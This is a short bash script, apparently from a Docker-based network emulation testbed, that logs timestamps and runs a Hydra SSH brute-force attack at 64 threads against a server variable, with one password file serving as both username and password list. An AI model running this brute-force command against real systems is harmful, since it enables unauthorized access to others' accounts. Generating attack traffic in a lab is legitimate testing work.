#!/bin/bash

log_dir="/var/log/dockemu"

log_file=${1:-"${RANDOM}.log"}
log_file=${log_dir}/${log_file}

echo "LOGFILE:" $log_file

echo "[STARTING  $(date +%D-%T) ]" | tee -a $log_file


hydra -L /passwords -V -P /passwords -t 64 $server ssh | tee -a $log_file


echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file
